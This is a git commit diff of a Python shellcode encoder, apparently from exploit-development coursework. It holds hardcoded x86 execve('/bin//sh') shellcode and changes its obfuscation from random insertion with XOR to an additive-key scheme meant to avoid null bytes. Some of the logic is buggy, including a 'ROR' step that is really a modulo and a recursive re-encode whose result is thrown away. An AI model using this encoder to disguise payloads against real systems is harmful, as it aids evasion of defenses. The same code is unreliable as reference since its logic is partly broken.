d4bb4b88867710e9b4a32d167f5779740b23959a
br0ns0n <bbmartin01@gmail.com>
2020-03-27 09:24:00 -0700

    Add files via upload

--- insertion_encoder.py
+++ insertion_encoder.py
@@ -1,7 +1,4 @@
-'Random Byte Insertion + Xor + ROR'
 #!/bin/python
-from random import randint
-
 
 payload = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
 shellcode = bytearray()
@@ -16,29 +13,23 @@ if len_shellcode % 2 == 1:
 
 bad_chars = ["\x00"]
 
-def encoder():
-    # Generate Encoded Shellcode
-    encode_shellcode = bytearray()
-    # range(start=0, stop=len_shellcode, step=2) step=2 skips over bytes
-    for i in range(0, len_shellcode, 2):
-        # generate random insertion bytes
-        x = randint(1, 255)
-        # Move first byte
-        byte_1 = shellcode[i]
-        # Move Second Byte
-        byte_2 = shellcode[i+1]
-        # Xor first byte
-        byte_1 = (x ^ byte_1)
-        # ROR second byte
-        byte_2 = (byte_1%(x+7))
+# Generate Random Key
+import random
+r = random.randint(2,44)
+key = int(r)
 
-        # Build Encoded Shellcode
-        encode_shellcode.append(x)
+def encoder():
+    encode_shellcode = bytearray()
+    for i in range(0, len_shellcode, 2):
+        byte_1 = shellcode[i]
+        byte_2 = shellcode[i+1]
+        byte_1 = (byte_1 + key) % 256
+        byte_2 = (byte_2 + key) % 256
         encode_shellcode.append(byte_1)
         encode_shellcode.append(byte_2)
         for i in bad_chars:
             if encode_shellcode.find(i) >= 0:
-                print("Illegal Char found , re-encoding wait :)")
+                print("Illegal Char found , re-encoding...)")
                 encoder()
 
     return encode_shellcode
@@ -46,14 +37,14 @@ def encoder():
 
 encoded_bytes = ""
 encoded_shellcode = encoder()
-for y in encoded_shellcode:
-    len_enc = len(str(hex(y)))
+encoded_shellcode.append(key)
+for byte_ in encoded_shellcode:
+    len_enc = len(str(hex(byte_)))
     if len_enc == 3:
-        encoded_bytes += str(hex(y)[:2])+"0"+str(hex(y)[2:])+","
+        encoded_bytes += str(hex(byte_)[:2])+"0"+str(hex(byte_)[2:])+","
     else:
-        encoded_bytes += str(hex(y))+","
+        encoded_bytes += str(hex(byte_))+","
 
-encoded_=encoded_bytes[:-1]
-print "[*] Size of original shellcode is: "+str(len(shellcode))
+encoded = encoded_bytes[:-1]
 print "[*] Size of encoded shellcode is: "+str(len(encoded_shellcode))
-print encoded_bytes
+print "[*] Encoded Shellcode is: "+encoded_bytes
